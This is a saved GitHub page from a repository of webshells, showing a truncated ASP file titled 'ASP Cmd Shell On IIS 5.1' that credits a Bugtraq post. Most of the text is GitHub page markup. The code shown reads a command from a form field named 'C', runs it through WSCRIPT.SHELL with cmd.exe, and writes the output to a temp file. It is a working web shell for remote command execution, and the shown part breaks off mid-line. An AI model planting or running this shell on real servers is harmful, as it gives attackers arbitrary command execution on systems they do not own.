




<!DOCTYPE html>
<html class="   ">
  <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# object: http://ogp.me/ns/object# article: http://ogp.me/ns/article# profile: http://ogp.me/ns/profile#">
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    
    <title>webshells/asp/cmd-asp-5.1.asp at master · BlackArch/webshells</title>
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub" />
    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub" />
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-144.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144.png" />
    <meta property="fb:app_id" content="1401488693436528"/>

      <meta content="@github" name="twitter:site" /><meta content="summary" name="twitter:card" /><meta content="BlackArch/webshells" name="twitter:title" /><meta content="Various webshells. We accept pull requests for additions to this collection." name="twitter:description" /><meta content="https://avatars2.githubusercontent.com/u/6171113?s=400" name="twitter:image:src" />
<meta content="GitHub" property="og:site_name" /><meta content="object" property="og:type" /><meta content="https://avatars2.githubusercontent.com/u/6171113?s=400" property="og:image" /><meta content="BlackArch/webshells" property="og:title" /><meta content="https://github.com/BlackArch/webshells" property="og:url" /><meta content="Various webshells. We accept pull requests for additions to this collection." property="og:description" />

    <link rel="assets" href="https://assets-cdn.github.com/">
    <link rel="conduit-xhr" href="https://ghconduit.com:25035">
    <link rel="xhr-socket" href="/_sockets" />

    <meta name="msapplication-TileImage" content="/windows-tile.png" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="selected-link" value="repo_source" data-pjax-transient />
      <meta name="google-analytics" content="UA-3769691-2">

    <meta content="collector.githubapp.com" name="octolytics-host" /><meta content="collector-cdn.github.com" name="octolytics-script-host" /><meta content="github" name="octolytics-app-id" /><meta content="DE5C913E:6433:2AEFF60:53CE3F63" name="octolytics-dimension-request_id" /><meta content="2731416" name="octolytics-actor-id" /><meta content="ihacku" name="octolytics-actor-login" /><meta content="870387b038a3f9cddc029a3bb3969d3e895c7b98b8649460fcadb0fbc1dea854" name="octolytics-actor-hash" />
    

    
    
    <link rel="icon" type="image/x-icon" href="https://assets-cdn.github.com/favicon.ico" />


    <meta content="authenticity_token" name="csrf-param" />
<meta content="507EUCRu/6OqDUxOTjlSeVShoxYqdkJ71wCvu5t5iHHFejANS28d6b2T2xH9w9Y9Rp9bR92WV7DvL2mFZlvVGQ==" name="csrf-token" />

    <link href="https://assets-cdn.github.com/assets/github-abff492f6a9e163d396bba5f179502525f18e2c7.css" media="all" rel="stylesheet" type="text/css" />
    <link href="https://assets-cdn.github.com/assets/github2-85ace430c1ff79f2ae2331a9ed0af2e5b46d5b18.css" media="all" rel="stylesheet" type="text/css" />
    


    <meta http-equiv="x-pjax-version" content="694e1dd5c4ec8d299c0f51289ad0a30d">

      
  <meta name="description" content="Various webshells. We accept pull requests for additions to this collection." />


  <meta content="6171113" name="octolytics-dimension-user_id" /><meta content="BlackArch" name="octolytics-dimension-user_login" /><meta content="14343142" name="octolytics-dimension-repository_id" /><meta content="BlackArch/webshells" name="octolytics-dimension-repository_nwo" /><meta content="true" name="octolytics-dimension-repository_public" /><meta content="false" name="octolytics-dimension-repository_is_fork" /><meta content="14343142" name="octolytics-dimension-repository_network_root_id" /><meta content="BlackArch/webshells" name="octolytics-dimension-repository_network_root_nwo" />

  <link href="https://github.com/BlackArch/webshells/commits/master.atom" rel="alternate" title="Recent Commits to webshells:master" type="application/atom+xml" />

  </head>


  <body class="logged_in  env-production windows vis-public page-blob">
    <a href="#start-of-content" tabindex="1" class="accessibility-aid js-skip-to-content">Skip to content</a>
    <div class="wrapper">
      
      
      
      


      <div class="header header-logged-in true">
  <div class="container clearfix">

    <a class="header-logo-invertocat" href="https://github.com/" aria-label="Homepage">
  <span class="mega-octicon octicon-mark-github"></span>
</a>


    
    <a href="/notifications" aria-label="You have no unread notifications" class="notification-indicator tooltipped tooltipped-s" data-hotkey="g n">
        <span class="mail-status all-read"></span>
</a>

      <div class="command-bar js-command-bar  in-repository">
          <form accept-charset="UTF-8" action="/search" class="command-bar-form" id="top_search_form" method="get">

<div class="commandbar">
  <span class="message"></span>
  <input type="text" data-hotkey="s, /" name="q" id="js-command-bar-field" placeholder="Search or type a command" tabindex="1" autocapitalize="off"
    
    data-username="ihacku"
    data-repo="BlackArch/webshells"
  >
  <div class="display hidden"></div>
</div>

    <input type="hidden" name="nwo" value="BlackArch/webshells" />

    <div class="select-menu js-menu-container js-select-menu search-context-select-menu">
      <span class="minibutton select-menu-button js-menu-target" role="button" aria-haspopup="true">
        <span class="js-select-button">This repository</span>
      </span>

      <div class="select-menu-modal-holder js-menu-content js-navigation-container" aria-hidden="true">
        <div class="select-menu-modal">

          <div class="select-menu-item js-navigation-item js-this-repository-navigation-item selected">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" class="js-search-this-repository" name="search_target" value="repository" checked="checked" />
            <div class="select-menu-item-text js-select-button-text">This repository</div>
          </div> <!-- /.select-menu-item -->

          <div class="select-menu-item js-navigation-item js-all-repositories-navigation-item">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" name="search_target" value="global" />
            <div class="select-menu-item-text js-select-button-text">All repositories</div>
          </div> <!-- /.select-menu-item -->

        </div>
      </div>
    </div>

  <span class="help tooltipped tooltipped-s" aria-label="Show command bar help">
    <span class="octicon octicon-question"></span>
  </span>


  <input type="hidden" name="ref" value="cmdform">

</form>
        <ul class="top-nav">
          <li class="explore"><a href="/explore">Explore</a></li>
            <li><a href="https://gist.github.com">Gist</a></li>
            <li><a href="/blog">Blog</a></li>
          <li><a href="https://help.github.com">Help</a></li>
        </ul>
      </div>

    

<ul id="user-links">
  <li>
    <a href="/ihacku" class="name">
      <img alt="ihacku" class=" js-avatar" data-user="2731416" height="20" src="https://avatars1.githubusercontent.com/u/2731416?s=140" width="20" /> ihacku
    </a>
  </li>

  <li class="new-menu dropdown-toggle js-menu-container">
    <a href="#" class="js-menu-target tooltipped tooltipped-s" aria-label="Create new...">
      <span class="octicon octicon-plus"></span>
      <span class="dropdown-arrow"></span>
    </a>

    <div class="new-menu-content js-menu-content">
    </div>
  </li>

  <li>
    <a href="/settings/profile" id="account_settings"
      class="tooltipped tooltipped-s"
      aria-label="Account settings ">
      <span class="octicon octicon-tools"></span>
    </a>
  </li>
  <li>
    <form accept-charset="UTF-8" action="/logout" class="logout-form" method="post"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="wSgk9ks9DWA+qbcfFzsd3naXvSHXoYgQ4z5TEP9ID6SsKA19M4GPS7CyIle7z8f0bkTO+pvOSueK1JTLCMxasg==" /></div>
      <button class="sign-out-button tooltipped tooltipped-s" aria-label="Sign out">
        <span class="octicon octicon-sign-out"></span>
      </button>
</form>  </li>

</ul>

<div class="js-new-dropdown-contents hidden">
  

<ul class="dropdown-menu">
  <li>
    <a href="/new"><span class="octicon octicon-repo"></span> New repository</a>
  </li>
  <li>
    <a href="/organizations/new"><span class="octicon octicon-organization"></span> New organization</a>
  </li>


    <li class="section-title">
      <span title="BlackArch/webshells">This repository</span>
    </li>
      <li>
        <a href="/BlackArch/webshells/issues/new"><span class="octicon octicon-issue-opened"></span> New issue</a>
      </li>
</ul>

</div>


    
  </div>
</div>

      

        



      <div id="start-of-content" class="accessibility-aid"></div>
          <div class="site" itemscope itemtype="http://schema.org/WebPage">
    <div id="js-flash-container">
      
    </div>
    <div class="pagehead repohead instapaper_ignore readability-menu">
      <div class="container">
        
<ul class="pagehead-actions">

    <li class="subscription">
      <form accept-charset="UTF-8" action="/notifications/subscribe" class="js-social-container" data-autosubmit="true" data-remote="true" method="post"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="krmabSEM1wTy/EUyhq2zEvhkbUEev7dkfvxCTaeO4/38C2y0ME86SlThRl/WRS5Y+RTMaVedAzSW3gn3D1kZBA==" /></div>  <input id="repository_id" name="repository_id" type="hidden" value="14343142" />

    <div class="select-menu js-menu-container js-select-menu">
      <a class="social-count js-social-count" href="/BlackArch/webshells/watchers">
        6
      </a>
      <a href="/BlackArch/webshells/subscription"
        class="minibutton select-menu-button with-count js-menu-target" role="button" tabindex="0" aria-haspopup="true">
        <span class="js-select-button">
          <span class="octicon octicon-eye"></span>
          Watch
        </span>
      </a>

      <div class="select-menu-modal-holder">
        <div class="select-menu-modal subscription-menu-modal js-menu-content" aria-hidden="true">
          <div class="select-menu-header">
            <span class="select-menu-title">Notifications</span>
            <span class="octicon octicon-x js-menu-close" role="button" aria-label="Close"></span>
          </div> <!-- /.select-menu-header -->

          <div class="select-menu-list js-navigation-container" role="menu">

            <div class="select-menu-item js-navigation-item selected" role="menuitem" tabindex="0">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <div class="select-menu-item-text">
                <input checked="checked" id="do_included" name="do" type="radio" value="included" />
                <h4>Not watching</h4>
                <span class="description">Be notified when participating or @mentioned.</span>
                <span class="js-select-button-text hidden-select-button-text">
                  <span class="octicon octicon-eye"></span>
                  Watch
                </span>
              </div>
            </div> <!-- /.select-menu-item -->

            <div class="select-menu-item js-navigation-item " role="menuitem" tabindex="0">
              <span class="select-menu-item-icon octicon octicon octicon-check"></span>
              <div class="select-menu-item-text">
                <input id="do_subscribed" name="do" type="radio" value="subscribed" />
                <h4>Watching</h4>
                <span class="description">Be notified of all conversations.</span>
                <span class="js-select-button-text hidden-select-button-text">
                  <span class="octicon octicon-eye"></span>
                  Unwatch
                </span>
              </div>
            </div> <!-- /.select-menu-item -->

            <div class="select-menu-item js-navigation-item " role="menuitem" tabindex="0">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <div class="select-menu-item-text">
                <input id="do_ignore" name="do" type="radio" value="ignore" />
                <h4>Ignoring</h4>
                <span class="description">Never be notified.</span>
                <span class="js-select-button-text hidden-select-button-text">
                  <span class="octicon octicon-mute"></span>
                  Stop ignoring
                </span>
              </div>
            </div> <!-- /.select-menu-item -->

          </div> <!-- /.select-menu-list -->

        </div> <!-- /.select-menu-modal -->
      </div> <!-- /.select-menu-modal-holder -->
    </div> <!-- /.select-menu -->

</form>
    </li>

  <li>
    

  <div class="js-toggler-container js-social-container starring-container ">

    <form accept-charset="UTF-8" action="/BlackArch/webshells/unstar" class="js-toggler-form starred" data-remote="true" method="post"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="Fn3CroB5pytd50NapY40BlZR1RrvXvXVVByODVxiVCSa0LSUeba/SStD8yAZLvQ0K1Vc1/OC0oD2pA27YsLitg==" /></div>
      <button
        class="minibutton with-count js-toggler-target star-button"
        aria-label="Unstar this repository" title="Unstar BlackArch/webshells">
        <span class="octicon octicon-star"></span>
        Unstar
      </button>
        <a class="social-count js-social-count" href="/BlackArch/webshells/stargazers">
          10
        </a>
</form>
    <form accept-charset="UTF-8" action="/BlackArch/webshells/star" class="js-toggler-form unstarred" data-remote="true" method="post"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="1yafAW6sHWax7MFpunx6DbF3ld/qvh64BJih3F7W6IYNLxt8IkGii+bCvVuPmDk486zYV3K7Impm/lhEaXAzIQ==" /></div>
      <button
        class="minibutton with-count js-toggler-target star-button"
        aria-label="Star this repository" title="Star BlackArch/webshells">
        <span class="octicon octicon-star"></span>
        Star
      </button>
        <a class="social-count js-social-count" href="/BlackArch/webshells/stargazers">
          10
        </a>
</form>  </div>

  </li>


        <li>
          <a href="/BlackArch/webshells/fork" class="minibutton with-count js-toggler-target fork-button lighter tooltipped-n" title="Fork your own copy of BlackArch/webshells to your account" aria-label="Fork your own copy of BlackArch/webshells to your account" rel="nofollow" data-method="post">
            <span class="octicon octicon-repo-forked"></span>
            Fork
          </a>
          <a href="/BlackArch/webshells/network" class="social-count">8</a>
        </li>

</ul>

        <h1 itemscope itemtype="http://data-vocabulary.org/Breadcrumb" class="entry-title public">
          <span class="repo-label"><span>public</span></span>
          <span class="mega-octicon octicon-repo"></span>
          <span class="author"><a href="/BlackArch" class="url fn" itemprop="url" rel="author"><span itemprop="title">BlackArch</span></a></span><!--
       --><span class="path-divider">/</span><!--
       --><strong><a href="/BlackArch/webshells" class="js-current-repository js-repo-home-link">webshells</a></strong>

          <span class="page-context-loader">
            <img alt="" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
          </span>

        </h1>
      </div><!-- /.container -->
    </div><!-- /.repohead -->

    <div class="container">
      <div class="repository-with-sidebar repo-container new-discussion-timeline js-new-discussion-timeline  ">
        <div class="repository-sidebar clearfix">
            

<div class="sunken-menu vertical-right repo-nav js-repo-nav js-repository-container-pjax js-octicon-loaders">
  <div class="sunken-menu-contents">
    <ul class="sunken-menu-group">
      <li class="tooltipped tooltipped-w" aria-label="Code">
        <a href="/BlackArch/webshells" aria-label="Code" class="selected js-selected-navigation-item sunken-menu-item" data-hotkey="g c" data-pjax="true" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches /BlackArch/webshells">
          <span class="octicon octicon-code"></span> <span class="full-word">Code</span>
          <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>

        <li class="tooltipped tooltipped-w" aria-label="Issues">
          <a href="/BlackArch/webshells/issues" aria-label="Issues" class="js-selected-navigation-item sunken-menu-item js-disable-pjax" data-hotkey="g i" data-selected-links="repo_issues repo_labels repo_milestones /BlackArch/webshells/issues">
            <span class="octicon octicon-issue-opened"></span> <span class="full-word">Issues</span>
            <span class='counter'>1</span>
            <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>        </li>

      <li class="tooltipped tooltipped-w" aria-label="Pull Requests">
        <a href="/BlackArch/webshells/pulls" aria-label="Pull Requests" class="js-selected-navigation-item sunken-menu-item js-disable-pjax" data-hotkey="g p" data-selected-links="repo_pulls /BlackArch/webshells/pulls">
            <span class="octicon octicon-git-pull-request"></span> <span class="full-word">Pull Requests</span>
            <span class='counter'>1</span>
            <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>


        <li class="tooltipped tooltipped-w" aria-label="Wiki">
          <a href="/BlackArch/webshells/wiki" aria-label="Wiki" class="js-selected-navigation-item sunken-menu-item js-disable-pjax" data-hotkey="g w" data-selected-links="repo_wiki /BlackArch/webshells/wiki">
            <span class="octicon octicon-book"></span> <span class="full-word">Wiki</span>
            <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>        </li>
    </ul>
    <div class="sunken-menu-separator"></div>
    <ul class="sunken-menu-group">

      <li class="tooltipped tooltipped-w" aria-label="Pulse">
        <a href="/BlackArch/webshells/pulse" aria-label="Pulse" class="js-selected-navigation-item sunken-menu-item" data-pjax="true" data-selected-links="pulse /BlackArch/webshells/pulse">
          <span class="octicon octicon-pulse"></span> <span class="full-word">Pulse</span>
          <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>

      <li class="tooltipped tooltipped-w" aria-label="Graphs">
        <a href="/BlackArch/webshells/graphs" aria-label="Graphs" class="js-selected-navigation-item sunken-menu-item" data-pjax="true" data-selected-links="repo_graphs repo_contributors /BlackArch/webshells/graphs">
          <span class="octicon octicon-graph"></span> <span class="full-word">Graphs</span>
          <img alt="" class="mini-loader" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>
    </ul>


  </div>
</div>

              <div class="only-with-full-nav">
                

  

<div class="clone-url open"
  data-protocol-type="http"
  data-url="/users/set_protocol?protocol_selector=http&amp;protocol_type=clone">
  <h3><strong>HTTPS</strong> clone URL</h3>
  <div class="clone-url-box">
    <input type="text" class="clone js-url-field"
           value="https://github.com/BlackArch/webshells.git" readonly="readonly">
    <span class="url-box-clippy">
    <button aria-label="Copy to clipboard" class="js-zeroclipboard minibutton zeroclipboard-button" data-clipboard-text="https://github.com/BlackArch/webshells.git" data-copied-hint="Copied!" type="button"><span class="octicon octicon-clippy"></span></button>
    </span>
  </div>
</div>

  

<div class="clone-url "
  data-protocol-type="ssh"
  data-url="/users/set_protocol?protocol_selector=ssh&amp;protocol_type=clone">
  <h3><strong>SSH</strong> clone URL</h3>
  <div class="clone-url-box">
    <input type="text" class="clone js-url-field"
           value="git@github.com:BlackArch/webshells.git" readonly="readonly">
    <span class="url-box-clippy">
    <button aria-label="Copy to clipboard" class="js-zeroclipboard minibutton zeroclipboard-button" data-clipboard-text="git@github.com:BlackArch/webshells.git" data-copied-hint="Copied!" type="button"><span class="octicon octicon-clippy"></span></button>
    </span>
  </div>
</div>

  

<div class="clone-url "
  data-protocol-type="subversion"
  data-url="/users/set_protocol?protocol_selector=subversion&amp;protocol_type=clone">
  <h3><strong>Subversion</strong> checkout URL</h3>
  <div class="clone-url-box">
    <input type="text" class="clone js-url-field"
           value="https://github.com/BlackArch/webshells" readonly="readonly">
    <span class="url-box-clippy">
    <button aria-label="Copy to clipboard" class="js-zeroclipboard minibutton zeroclipboard-button" data-clipboard-text="https://github.com/BlackArch/webshells" data-copied-hint="Copied!" type="button"><span class="octicon octicon-clippy"></span></button>
    </span>
  </div>
</div>


<p class="clone-options">You can clone with
      <a href="#" class="js-clone-selector" data-protocol="http">HTTPS</a>,
      <a href="#" class="js-clone-selector" data-protocol="ssh">SSH</a>,
      or <a href="#" class="js-clone-selector" data-protocol="subversion">Subversion</a>.
  <a href="https://help.github.com/articles/which-remote-url-should-i-use" class="help tooltipped tooltipped-n" aria-label="Get help on which URL is right for you.">
    <span class="octicon octicon-question"></span>
  </a>
</p>


  <a href="http://windows.github.com" class="minibutton sidebar-button" title="Save BlackArch/webshells to your computer and use it in GitHub Desktop." aria-label="Save BlackArch/webshells to your computer and use it in GitHub Desktop.">
    <span class="octicon octicon-device-desktop"></span>
    Clone in Desktop
  </a>

                <a href="/BlackArch/webshells/archive/master.zip"
                   class="minibutton sidebar-button"
                   aria-label="Download BlackArch/webshells as a zip file"
                   title="Download BlackArch/webshells as a zip file"
                   rel="nofollow">
                  <span class="octicon octicon-cloud-download"></span>
                  Download ZIP
                </a>
              </div>
        </div><!-- /.repository-sidebar -->

        <div id="js-repo-pjax-container" class="repository-content context-loader-container" data-pjax-container>
          


<a href="/BlackArch/webshells/blob/690ebd95e9cfd69ec600e3fd9b4c168757fece8f/asp/cmd-asp-5.1.asp" class="hidden js-permalink-shortcut" data-hotkey="y">Permalink</a>

<!-- blob contrib key: blob_contributors:v21:48b77dbdf984b174c37e65ca597553f7 -->

<p title="This is a placeholder element" class="js-history-link-replace hidden"></p>

<div class="file-navigation">
  

<div class="select-menu js-menu-container js-select-menu" >
  <span class="minibutton select-menu-button js-menu-target css-truncate" data-hotkey="w"
    data-master-branch="master"
    data-ref="master"
    title="master"
    role="button" aria-label="Switch branches or tags" tabindex="0" aria-haspopup="true">
    <span class="octicon octicon-git-branch"></span>
    <i>branch:</i>
    <span class="js-select-button css-truncate-target">master</span>
  </span>

  <div class="select-menu-modal-holder js-menu-content js-navigation-container" data-pjax aria-hidden="true">

    <div class="select-menu-modal">
      <div class="select-menu-header">
        <span class="select-menu-title">Switch branches/tags</span>
        <span class="octicon octicon-x js-menu-close" role="button" aria-label="Close"></span>
      </div> <!-- /.select-menu-header -->

      <div class="select-menu-filters">
        <div class="select-menu-text-filter">
          <input type="text" aria-label="Filter branches/tags" id="context-commitish-filter-field" class="js-filterable-field js-navigation-enable" placeholder="Filter branches/tags">
        </div>
        <div class="select-menu-tabs">
          <ul>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="branches" class="js-select-menu-tab">Branches</a>
            </li>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="tags" class="js-select-menu-tab">Tags</a>
            </li>
          </ul>
        </div><!-- /.select-menu-tabs -->
      </div><!-- /.select-menu-filters -->

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="branches">

        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


            <div class="select-menu-item js-navigation-item selected">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/BlackArch/webshells/blob/master/asp/cmd-asp-5.1.asp"
                 data-name="master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text css-truncate-target"
                 title="master">master</a>
            </div> <!-- /.select-menu-item -->
        </div>

          <div class="select-menu-no-results">Nothing to show</div>
      </div> <!-- /.select-menu-list -->

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="tags">
        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/BlackArch/webshells/tree/v2/asp/cmd-asp-5.1.asp"
                 data-name="v2"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text css-truncate-target"
                 title="v2">v2</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/BlackArch/webshells/tree/v1/asp/cmd-asp-5.1.asp"
                 data-name="v1"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text css-truncate-target"
                 title="v1">v1</a>
            </div> <!-- /.select-menu-item -->
        </div>

        <div class="select-menu-no-results">Nothing to show</div>
      </div> <!-- /.select-menu-list -->

    </div> <!-- /.select-menu-modal -->
  </div> <!-- /.select-menu-modal-holder -->
</div> <!-- /.select-menu -->

  <div class="button-group right">
    <a href="/BlackArch/webshells/find/master"
          class="js-show-file-finder minibutton empty-icon tooltipped tooltipped-s"
          data-pjax
          data-hotkey="t"
          aria-label="Quickly jump between files">
      <span class="octicon octicon-list-unordered"></span>
    </a>
    <button class="js-zeroclipboard minibutton zeroclipboard-button"
          data-clipboard-text="asp/cmd-asp-5.1.asp"
          aria-label="Copy to clipboard"
          data-copied-hint="Copied!">
      <span class="octicon octicon-clippy"></span>
    </button>
  </div>

  <div class="breadcrumb">
    <span class='repo-root js-repo-root'><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/BlackArch/webshells" data-branch="master" data-direction="back" data-pjax="true" itemscope="url"><span itemprop="title">webshells</span></a></span></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/BlackArch/webshells/tree/master/asp" data-branch="master" data-direction="back" data-pjax="true" itemscope="url"><span itemprop="title">asp</span></a></span><span class="separator"> / </span><strong class="final-path">cmd-asp-5.1.asp</strong>
  </div>
</div>


  <div class="commit commit-loader file-history-tease js-deferred-content" data-url="/BlackArch/webshells/contributors/master/asp/cmd-asp-5.1.asp">
    Fetching contributors…

    <div class="participation">
      <p class="loader-loading"><img alt="" height="16" src="https://assets-cdn.github.com/images/spinners/octocat-spinner-32-EAF2F5.gif" width="16" /></p>
      <p class="loader-error">Cannot retrieve contributors at this time</p>
    </div>
  </div>

<div class="file-box">
  <div class="file">
    <div class="meta clearfix">
      <div class="info file-name">
        <span class="icon"><b class="octicon octicon-file-text"></b></span>
        <span class="mode" title="File Mode">file</span>
        <span class="meta-divider"></span>
          <span>41 lines (36 sloc)</span>
          <span class="meta-divider"></span>
        <span>1.2 kb</span>
      </div>
      <div class="actions">
        <div class="button-group">
            <a class="minibutton tooltipped tooltipped-w"
               href="http://windows.github.com" aria-label="Open this file in GitHub for Windows">
                <span class="octicon octicon-device-desktop"></span> Open
            </a>
                <a class="minibutton tooltipped tooltipped-n js-update-url-with-hash"
                   aria-label="Clicking this button will automatically fork this project so you can edit the file"
                   href="/BlackArch/webshells/edit/master/asp/cmd-asp-5.1.asp"
                   data-method="post" rel="nofollow">Edit</a>
          <a href="/BlackArch/webshells/raw/master/asp/cmd-asp-5.1.asp" class="minibutton " id="raw-url">Raw</a>
            <a href="/BlackArch/webshells/blame/master/asp/cmd-asp-5.1.asp" class="minibutton js-update-url-with-hash">Blame</a>
          <a href="/BlackArch/webshells/commits/master/asp/cmd-asp-5.1.asp" class="minibutton " rel="nofollow">History</a>
        </div><!-- /.button-group -->

            <a class="minibutton danger empty-icon tooltipped tooltipped-s"
               href="/BlackArch/webshells/delete/master/asp/cmd-asp-5.1.asp"
               aria-label="Fork this project and delete file"
               data-method="post" data-test-id="delete-blob-file" rel="nofollow">

          Delete
        </a>
      </div><!-- /.actions -->
    </div>
      
  <div class="blob-wrapper data type-asp js-blob-data">
       <table class="file-code file-diff tab-size-8">
         <tr class="file-code-line">
           <td class="blob-line-nums">
             <span id="L1" rel="#L1">1</span>
<span id="L2" rel="#L2">2</span>
<span id="L3" rel="#L3">3</span>
<span id="L4" rel="#L4">4</span>
<span id="L5" rel="#L5">5</span>
<span id="L6" rel="#L6">6</span>
<span id="L7" rel="#L7">7</span>
<span id="L8" rel="#L8">8</span>
<span id="L9" rel="#L9">9</span>
<span id="L10" rel="#L10">10</span>
<span id="L11" rel="#L11">11</span>
<span id="L12" rel="#L12">12</span>
<span id="L13" rel="#L13">13</span>
<span id="L14" rel="#L14">14</span>
<span id="L15" rel="#L15">15</span>
<span id="L16" rel="#L16">16</span>
<span id="L17" rel="#L17">17</span>
<span id="L18" rel="#L18">18</span>
<span id="L19" rel="#L19">19</span>
<span id="L20" rel="#L20">20</span>
<span id="L21" rel="#L21">21</span>
<span id="L22" rel="#L22">22</span>
<span id="L23" rel="#L23">23</span>
<span id="L24" rel="#L24">24</span>
<span id="L25" rel="#L25">25</span>
<span id="L26" rel="#L26">26</span>
<span id="L27" rel="#L27">27</span>
<span id="L28" rel="#L28">28</span>
<span id="L29" rel="#L29">29</span>
<span id="L30" rel="#L30">30</span>
<span id="L31" rel="#L31">31</span>
<span id="L32" rel="#L32">32</span>
<span id="L33" rel="#L33">33</span>
<span id="L34" rel="#L34">34</span>
<span id="L35" rel="#L35">35</span>
<span id="L36" rel="#L36">36</span>
<span id="L37" rel="#L37">37</span>
<span id="L38" rel="#L38">38</span>
<span id="L39" rel="#L39">39</span>
<span id="L40" rel="#L40">40</span>
<span id="L41" rel="#L41">41</span>

           </td>
           <td class="blob-line-code"><div class="code-body highlight"><pre><div class='line' id='LC1'><span class="nt">&lt;%</span></div><div class='line' id='LC2'><br/></div><div class='line' id='LC3'><span class="c">&#39; ASP Cmd Shell On IIS 5.1</span></div><div class='line' id='LC4'><span class="c">&#39; brett.moore_at_security-assessment.com </span></div><div class='line' id='LC5'><span class="c">&#39; http://seclists.org/bugtraq/2006/Dec/0226.html</span></div><div class='line' id='LC6'><br/></div><div class='line' id='LC7'><br/></div><div class='line' id='LC8'><span class="k">Dim</span> <span class="n">oS</span><span class="p">,</span><span class="n">oSNet</span><span class="p">,</span><span class="n">oFSys</span><span class="p">,</span> <span class="k">oF</span><span class="p">,</span><span class="n">szCMD</span><span class="p">,</span> <span class="n">szTF</span></div><div class='line' id='LC9'><span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span></div><div class='line' id='LC10'><span class="k">Set</span> <span class="n">oS</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;WSCRIPT.SHELL&quot;</span><span class="p">)</span></div><div class='line' id='LC11'><span class="k">Set</span> <span class="n">oSNet</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;WSCRIPT.NETWORK&quot;</span><span class="p">)</span></div><div class='line' id='LC12'><span class="k">Set</span> <span class="n">oFSys</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;Scripting.FileSystemObject&quot;</span><span class="p">)</span></div><div class='line' id='LC13'><span class="n">szCMD</span> <span class="o">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">(</span><span class="s">&quot;C&quot;</span><span class="p">)</span></div><div class='line' id='LC14'><span class="k">If</span> <span class="p">(</span><span class="n">szCMD</span> <span class="o">&lt;&gt;</span> <span class="s">&quot;&quot;</span><span class="p">)</span> <span class="k">Then</span></div><div class='line' id='LC15'>&nbsp;&nbsp;<span class="n">szTF</span> <span class="o">=</span> <span class="s">&quot;c:\windows\pchealth\ERRORREP\QHEADLES\&quot;</span> <span class="o">&amp;</span>  <span class="n">oFSys</span><span class="p">.</span><span class="n">GetTempName</span><span class="p">()</span></div><div class='line' id='LC16'>&nbsp;&nbsp;<span class="c">&#39; Here we do the command</span></div><div class='line' id='LC17'>&nbsp;&nbsp;<span class="k">Call</span> <span class="n">oS</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="s">&quot;win.com cmd.exe /c &quot;&quot;&quot;</span> <span class="o">&amp;</span> <span class="n">szCMD</span> <span class="o">&amp;</span> <span class="s">&quot; &gt; &quot;</span> <span class="o">&amp;</span> <span class="n">szTF</span> <span class="o">&amp;</span></div><div class='line' id='LC18'><span class="s">&quot;&quot;&quot;&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">True</span><span class="p">)</span></div><div class='line' id='LC19'>&nbsp;&nbsp;<span class="n">response</span><span class="p">.</span><span class="n">write</span> <span class="n">szTF</span></div><div class='line' id='LC20'>&nbsp;&nbsp;<span class="c">&#39; Change 